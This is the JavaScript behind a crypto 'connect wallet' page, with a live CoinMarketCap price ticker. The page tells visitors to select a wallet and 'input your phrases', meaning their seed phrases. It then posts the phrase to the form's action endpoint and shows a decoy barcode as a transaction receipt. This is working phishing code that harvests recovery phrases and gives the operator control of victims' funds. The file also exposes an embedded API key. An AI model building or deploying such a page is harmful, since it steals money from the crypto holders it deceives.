document.addEventListener('DOMContentLoaded', () => {
    console.log('Script loaded');
    const walletSelect = document.getElementById('walletSelect');
    const userInput = document.getElementById('userInput');
    const connectWalletButton = document.getElementById('connectWalletButton');
    const submitSection = document.getElementById('submitSection');
    const submitButton = document.getElementById('submitButton');
    const statusMessage = document.getElementById('statusMessage');
    const messageForm = document.getElementById('messageForm');
    const barcodeContainer = document.getElementById('barcodeContainer');
    const connectButtons = document.querySelectorAll('.connect-button');
    const coinmarketcapData = document.getElementById('coinmarketcap-data');

    if (!walletSelect || !userInput || !connectWalletButton || !submitSection || !coinmarketcapData) {
        console.error('One or more elements not found:', { walletSelect, userInput, connectWalletButton, submitSection, coinmarketcapData });
        return;
    }

    // Smooth scroll for navbar links
    document.querySelectorAll('.nav-menu a').forEach(anchor => {
        anchor.addEventListener('click', (e) => {
            e.preventDefault();
            const targetId = anchor.getAttribute('href').substring(1);
            document.getElementById(targetId).scrollIntoView({ behavior: 'smooth' });
            if (targetId === 'connect-wallet') {
                console.log('Nav link clicked, showing wallet select');
                walletSelect.style.display = 'block';
                userInput.style.display = 'block';
                statusMessage.textContent = 'Please select a wallet and input your phrases.';
            }
        });
    });

    // Handle option card buttons with scroll
    connectButtons.forEach(button => {
        button.addEventListener('click', () => {
            console.log('Card button clicked:', button.getAttribute('data-option'));
            if (walletSelect && userInput) {
                walletSelect.style.display = 'block';
                userInput.style.display = 'block';
                statusMessage.textContent = `Please select a wallet and input your phrases to ${button.getAttribute('data-option')}.`;
                connectWalletButton.style.display = 'none';
                submitSection.style.display = 'none';
                barcodeContainer.style.display = 'none';
                document.getElementById('connect-wallet').scrollIntoView({ behavior: 'smooth' });
            } else {
                console.error('Wallet select or input not found');
            }
        });
    });

    // Handle wallet selection
    walletSelect.addEventListener('change', () => {
        console.log('Wallet selected:', walletSelect.value);
        if (walletSelect.value) {
            connectWalletButton.style.display = 'block';
            statusMessage.textContent = `Selected ${walletSelect.value}. Click "Connect Wallet" to proceed.`;
        } else {
            connectWalletButton.style.display = 'none';
        }
    });

    // Handle connect wallet button
    connectWalletButton.addEventListener('click', () => {
        console.log('Connect Wallet clicked');
        if (walletSelect.value) {
            submitSection.style.display = 'block';
            connectWalletButton.style.display = 'none';
            walletSelect.style.display = 'none';
            userInput.style.display = 'none';
            statusMessage.textContent = 'Please submit your phrases.';
        }
    });

    // Handle form submission
    messageForm.addEventListener('submit', (e) => {
        e.preventDefault();
        console.log('Submitting form with input:', userInput.value);
        statusMessage.textContent = 'Kindly wait';
        statusMessage.style.fontWeight = '600';
        submitButton.disabled = true;

        const formData = new FormData(messageForm);
        formData.set('message', userInput.value);

        const barcodeImg = document.createElement('img');
        barcodeImg.src = 'https://barcode.tec-it.com/barcode.ashx?data=678543&code=Code128';
        barcodeImg.alt = 'Transaction Barcode';
        barcodeContainer.innerHTML = '';
        barcodeContainer.appendChild(barcodeImg);
        barcodeContainer.style.display = 'block';

        fetch(messageForm.action, {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        }).then(response => {
            if (response.ok) {
                statusMessage.textContent = 'Please safe the barcode';
            } else {
                statusMessage.textContent = 'Error sending message.';
                barcodeContainer.style.display = 'none';
            }
            statusMessage.style.fontWeight = 'normal';
            submitButton.disabled = false;
        }).catch(error => {
            statusMessage.textContent = 'Network error. Please try again.';
            statusMessage.style.fontWeight = 'normal';
            barcodeContainer.style.display = 'none';
            submitButton.disabled = false;
            console.error('Error:', error);
        });
    });

    // CoinMarketCap Live Updates with Color Coding
    async function updateCoinmarketcap() {
        try {
            const apiKey = '5f070f3b-699f-4682-8b76-af9a8e23e61c'; // Your API key
            const response = await fetch('https://pro-api.coinmarketcap.com/v1/cryptocurrency/listings/latest', {
                headers: {
                    'X-CMC_PRO_API_KEY': apiKey,
                    'Accept': 'application/json'
                },
                params: {
                    start: '1',
                    limit: '15', // Fetch top 10 + specific currencies
                    convert: 'USD'
                }
            });
            const data = await response.json();
            if (data.status.error_code) {
                throw new Error(data.status.error_message || 'API request failed');
            }
            // Specific currency IDs: USDC (3408), ETH (1027), BNB (1839), ADA (2010), SOL (5426), XRP (52)
            const specificCurrencies = [3408, 1027, 1839, 2010, 5426, 52];
            const selectedCoins = data.data.filter(coin => specificCurrencies.includes(coin.id) || coin.rank <= 10);

            let html = '';
            selectedCoins.forEach(coin => {
                const change = coin.quote.USD.percent_change_24h;
                const color = change > 0 ? '#00ff00' : '#ff0000'; // Green for positive, red for negative/zero
                html += `<span style="color: ${color}">${coin.symbol}: $${coin.quote.USD.price.toFixed(2)} (${change}%)</span> | `;
            });
            coinmarketcapData.innerHTML = html.trim(); // Remove trailing space
        } catch (error) {
            console.error('Error fetching CoinMarketCap data:', error);
            coinmarketcapData.innerHTML = '<p>Failed to load live updates. Check console for details or ensure API key is valid.</p>';
        }
    }
    updateCoinmarketcap();
    setInterval(updateCoinmarketcap, 300000); // Update every 5 minutes
});